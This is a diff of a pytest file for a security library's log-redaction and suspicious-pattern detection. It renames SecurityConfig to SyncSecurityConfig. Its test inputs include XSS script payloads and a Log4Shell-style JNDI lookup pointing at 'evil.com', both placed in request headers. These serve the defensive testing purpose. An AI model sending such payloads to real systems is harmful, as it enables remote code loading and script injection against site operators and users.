@@ -3,7 +3,7 @@ import logging
 
 import pytest
 
-from guard_core.models import SecurityConfig
+from guard_core.models import SyncSecurityConfig
 from guard_core.sync.handlers.suspatterns_handler import sus_patterns_handler
 from guard_core.sync.utils import (
     _DEFAULT_SENSITIVE_LOG_HEADERS,
@@ -16,13 +16,13 @@ from tests.test_sync.conftest import SyncMockGuardRequest
 
 @pytest.fixture(autouse=True)
 def _force_enhanced_detection_singleton() -> None:
-    sus_patterns_handler.configure(SecurityConfig())
+    sus_patterns_handler.configure(SyncSecurityConfig())
 
 
 def test_default_sensitive_cookie_header_redacted_with_extra_config(
     caplog: pytest.LogCaptureFixture,
 ) -> None:
-    config = SecurityConfig(log_sensitive_headers={"x-session"})
+    config = SyncSecurityConfig(log_sensitive_headers={"x-session"})
     request = SyncMockGuardRequest(
         headers={
             "Cookie": (
@@ -47,7 +47,7 @@ def test_default_sensitive_cookie_header_redacted_with_extra_config(
 def test_custom_sensitive_header_redacted_via_log_sensitive_headers_config(
     caplog: pytest.LogCaptureFixture,
 ) -> None:
-    config = SecurityConfig(log_sensitive_headers={"x-session"})
+    config = SyncSecurityConfig(log_sensitive_headers={"x-session"})
     request = SyncMockGuardRequest(
         headers={"X-Session": "tok-SECRET2 <script>alert(1)</script>"},
     )
@@ -68,7 +68,7 @@ def test_custom_sensitive_header_redacted_via_log_sensitive_headers_config(
 def test_non_sensitive_header_value_still_logged_verbatim(
     caplog: pytest.LogCaptureFixture,
 ) -> None:
-    config = SecurityConfig(log_sensitive_headers={"x-session"})
+    config = SyncSecurityConfig(log_sensitive_headers={"x-session"})
     request = SyncMockGuardRequest(headers={"X-Custom": "<script>alert(1)</script>"})
 
     with caplog.at_level(logging.WARNING, logger="guard_core"):
@@ -81,7 +81,7 @@ def test_non_sensitive_header_value_still_logged_verbatim(
 def test_non_sensitive_excluded_header_value_still_logged_verbatim(
     caplog: pytest.LogCaptureFixture,
 ) -> None:
-    config = SecurityConfig(log_sensitive_headers={"x-session"})
+    config = SyncSecurityConfig(log_sensitive_headers={"x-session"})
     request = SyncMockGuardRequest(
         headers={"User-Agent": "${jndi:ldap://evil.com/a}"},
     )
@@ -99,7 +99,7 @@ _HEADER_XSS_PAYLOAD = "<script>alert(1)</script>"
 def test_non_sensitive_header_embedded_json_sensitive_field_redacted(
     caplog: pytest.LogCaptureFixture,
 ) -> None:
-    config = SecurityConfig()
+    config = SyncSecurityConfig()
     payload = json.dumps({"password": _HEADER_XSS_PAYLOAD, "note": "benign"})
     request = SyncMockGuardRequest(headers={"X-Custom": payload})
 
@@ -118,7 +118,7 @@ def test_non_sensitive_header_embedded_json_sensitive_field_redacted(
 def test_non_sensitive_header_embedded_json_sibling_secret_stays_redacted(
     caplog: pytest.LogCaptureFixture,
 ) -> None:
-    config = SecurityConfig()
+    config = SyncSecurityConfig()
     secret = "PASSWORD-SIBLING-SECRET"
     payload = json.dumps({"password": secret, "note": _HEADER_XSS_PAYLOAD})
     request = SyncMockGuardRequest(headers={"X-Custom": payload})
@@ -139,7 +139,7 @@ def test_non_sensitive_header_embedded_json_sibling_secret_stays_redacted(
 def test_non_sensitive_header_embedded_json_custom_sensitive_field_redacted(
     caplog: pytest.LogCaptureFixture,
 ) -> None:
-    config = SecurityConfig(log_sensitive_body_fields={"custom_secret"})
+    config = SyncSecurityConfig(log_sensitive_body_fields={"custom_secret"})
     payload = json.dumps({"custom_secret": _HEADER_XSS_PAYLOAD, "note": "benign"})
     request = SyncMockGuardRequest(headers={"X-Custom": payload})
 
@@ -158,7 +158,7 @@ def test_non_sensitive_header_embedded_json_custom_sensitive_field_redacted(
 def test_sensitive_header_with_log_suspicious_level_none_emits_no_detection_line(
     caplog: pytest.LogCaptureFixture,
 ) -> None:
-    config = SecurityConfig(
+    config = SyncSecurityConfig(
         log_sensitive_headers={"x-session"}, log_suspicious_level=None
     )
     request = SyncMockGuardRequest(
@@ -196,7 +196,7 @@ def test_config_none_uses_default_sensitive_header_set(
 def test_excluded_header_branch_sensitive_referer_redacted(
     caplog: pytest.LogCaptureFixture,
 ) -> None:
-    config = SecurityConfig(log_sensitive_headers={"referer"})
+    config = SyncSecurityConfig(log_sensitive_headers={"referer"})
     request = SyncMockGuardRequest(headers={"Referer": "${jndi:ldap://evil.com/a}"})
 
     with caplog.at_level(logging.WARNING, logger="guard_core"):
@@ -209,7 +209,7 @@ def test_excluded_header_branch_sensitive_referer_redacted(
 
 
 def test_sensitive_header_benign_value_not_detected() -> None:
-    config = SecurityConfig(log_sensitive_headers={"x-session"})
+    config = SyncSecurityConfig(log_sensitive_headers={"x-session"})
     request = SyncMockGuardRequest(headers={"X-Session": "tok-BENIGN"})
 
     result = detect_penetration_attempt(request, config)
@@ -231,6 +231,6 @@ def test_resolve_sensitive_log_headers_config_none_returns_default() -> None:
 
 
 def test_resolve_sensitive_log_headers_with_config_extras() -> None:
-    config = SecurityConfig(log_sensitive_headers={"x-session"})
+    config = SyncSecurityConfig(log_sensitive_headers={"x-session"})
     result = _resolve_sensitive_log_headers(config)
     assert result == _DEFAULT_SENSITIVE_LOG_HEADERS | {"x-session"}
